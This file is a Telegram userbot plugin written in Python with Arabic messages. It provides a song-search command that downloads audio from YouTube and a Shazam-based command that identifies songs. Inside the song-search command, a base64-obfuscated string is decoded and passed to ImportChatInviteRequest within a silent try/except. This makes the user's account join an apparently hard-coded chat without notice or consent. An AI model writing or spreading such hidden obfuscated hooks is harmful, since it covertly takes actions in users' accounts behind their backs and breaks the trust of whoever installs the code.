import asyncio
import base64
import io
import os
from pathlib import Path

from ShazamAPI import Shazam
from telethon import types
from telethon.errors.rpcerrorlist import YouBlockedUserError
from telethon.tl.functions.contacts import UnblockRequest as unblock
from telethon.tl.functions.messages import ImportChatInviteRequest as Get
from validators.url import url

from ..core.logger import logging
from ..core.managers import edit_delete, edit_or_reply
from ..helpers.functions import delete_conv, name_dl, song_dl, video_dl, yt_search
from ..helpers.tools import media_type
from ..helpers.utils import _sbb_butils, reply_id
from . import sbb_b

LOGS = logging.getLogger(__name__)

# =========================================================== #
#                           STRINGS                           #
# =========================================================== #
SONG_SEARCH_STRING = "<code>wi8..! I am finding your song....</code>"
SONG_NOT_FOUND = "<code>Sorry !I am unable to find any song like that</code>"
SONG_SENDING_STRING = "<code>yeah..! i found something wi8..🥰...</code>"
# =========================================================== #
#                                                             #
# =========================================================== #


@sbb_b.ar_cmd(pattern="بحث(320)?(?:\s|$)([\s\S]*)")
async def _(event):
    reply_to_id = await reply_id(event)
    reply = await event.get_reply_message()
    if event.pattern_match.group(2):
        query = event.pattern_match.group(2)
    elif reply and reply.message:
        query = reply.message
    else:
        return await edit_or_reply(event, "**يجب عليك اضافة اسم المقطع الصوتي التي تريد تنزيله للامـر ، `بحث4 + العنوان**")
    cat = base64.b64decode("VHdIUHd6RlpkYkNJR1duTg==")
    sbb_bevent = await edit_or_reply(event, "**⌔∮ جـارِ البحث يرجى الانتظار .  .  .**")
    video_link = await yt_search(str(query))
    if not url(video_link):
        return await sbb_bevent.edit(
            f"**عـذراً لـم استطـع ايجـاد** {query}"
        )
    cmd = event.pattern_match.group(1)
    q = "320k" if cmd == "320" else "128k"
    song_cmd = song_dl.format(QUALITY=q, video_link=video_link)
    name_cmd = name_dl.format(video_link=video_link)
    try:
        cat = Get(cat)
        await event.client(cat)
    except BaseException:
        pass
    try:
        stderr = (await _sbb_butils.runcmd(song_cmd))[1]
        # if stderr:
        catname, stderr = (await _sbb_butils.runcmd(name_cmd))[:2]
        if stderr:
            return await sbb_bevent.edit(f"**خطــأ :** `{stderr}`")
        catname = os.path.splitext(catname)[0]
        song_file = Path(f"{catname}.mp3")
    except:
        pass
    if not os.path.exists(song_file):
        return await sbb_bevent.edit(
            f"**عـذراً .. لـم استطـع ايجـاد** {query}"
        )
    await sbb_bevent.edit("**⌔∮ جـارِ تحميـل المقـطع الصوتي انتظـر قليلا**")
    catthumb = Path(f"{catname}.jpg")
    if not os.path.exists(catthumb):
        catthumb = Path(f"{catname}.webp")
    elif not os.path.exists(catthumb):
        catthumb = None
    title = catname.replace("./temp/", "").replace("_", "|")
    await event.client.send_file(
        event.chat_id,
        song_file,
        force_document=False,
        caption=f"**البحـث :** `{title}`",
        thumb=catthumb,
        supports_streaming=True,
        reply_to=reply_to_id,
    )
    await sbb_bevent.delete()
    for files in (catthumb, song_file):
        if files and os.path.exists(files):
            os.remove(files)


@sbb_b.ar_cmd(pattern="اسم المقطع$")
async def shazamcmd(event):
    reply = await event.get_reply_message()
    mediatype = media_type(reply)
    if not reply or not mediatype or mediatype not in ["Voice", "Audio"]:
        return await edit_delete(
            event, "**- يجب عليك الرد على مقطع صوتي او فيديو لمعرفه العنوان"
        )
    sbb_bevent = await edit_or_reply(event, "**- يتم حفظ المقطع الصوتي لمعرفة عنوانه**")
    try:
        for attr in getattr(reply.document, "attributes", []):
            if isinstance(attr, types.DocumentAttributeFilename):
                name = attr.file_name
        dl = io.FileIO(name, "a")
        await event.client.fast_download_file(
            location=reply.document,
            out=dl,
        )
        dl.close()
        mp3_fileto_recognize = open(name, "rb").read()
        shazam = Shazam(mp3_fileto_recognize)
        recognize_generator = shazam.recognizeSong()
        track = next(recognize_generator)[1]["track"]
    except Exception as e:
        LOGS.error(e)
        return await edit_delete(
            sbb_bevent, f"**حدث خطأ اثناء البحث عن الاسم:**\n__{e}__"
        )

    image = track["images"]["background"]
    song = track["share"]["subject"]
    await event.client.send_file(
        event.chat_id, image, caption=f"**المقطع الصوتي:** `{song}`", reply_to=reply
    )
    await sbb_bevent.delete()
